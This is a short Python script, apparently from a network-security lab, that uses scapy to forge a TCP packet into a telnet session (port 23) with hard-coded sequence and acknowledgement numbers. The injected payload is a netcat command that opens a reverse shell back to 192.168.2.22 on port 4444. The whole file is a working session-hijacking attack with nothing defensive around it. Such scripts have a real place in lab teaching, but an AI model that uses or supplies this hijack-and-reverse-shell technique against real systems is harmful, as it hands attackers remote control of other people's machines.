from scapy.all import *

IPLayer = IP(src="192.168.2.22", dst="192.168.2.33")
TCPLayer = TCP(sport=53688, dport=23, flags="A", seq=963469140, ack=3344289089)

data = "\n nc -e /bin/sh 192.168.2.22 4444 \n"

pkt = IPLayer/TCPLayer/data
ls(pkt)
send(pkt, verbose= 0)
